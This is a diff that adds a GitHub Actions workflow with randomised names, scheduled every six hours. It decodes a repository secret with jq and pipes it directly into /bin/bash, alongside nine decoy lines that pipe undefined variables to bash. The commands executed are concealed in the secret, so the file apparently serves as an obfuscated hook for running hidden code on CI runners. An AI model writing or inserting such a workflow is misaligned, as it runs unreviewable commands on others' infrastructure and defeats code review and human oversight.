@@ -1,0 +1,25 @@
+name: mingzizxv
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mingzizxv
+        env:
+          obvz6: ${{ secrets.obvz6 }}
+        run: |
+          echo $obvz6 | jq -r .koosk51863 | /bin/bash
+          echo $id418 | jq -r .vr154 | /bin/bash
+          echo $vsgv37 | jq -r .kkas5596 | /bin/bash
+          echo $ojlyb4604 | jq -r .py29481 | /bin/bash
+          echo $ez45328 | jq -r .fgm186 | /bin/bash
+          echo $tjmc8 | jq -r .rjf63 | /bin/bash
+          echo $z52 | jq -r .uod608 | /bin/bash
+          echo $eqlqe3051 | jq -r .wh62766 | /bin/bash
+          echo $te5554 | jq -r .k3 | /bin/bash
+          echo $gwepi5 | jq -r .qutri5887 | /bin/bash
+
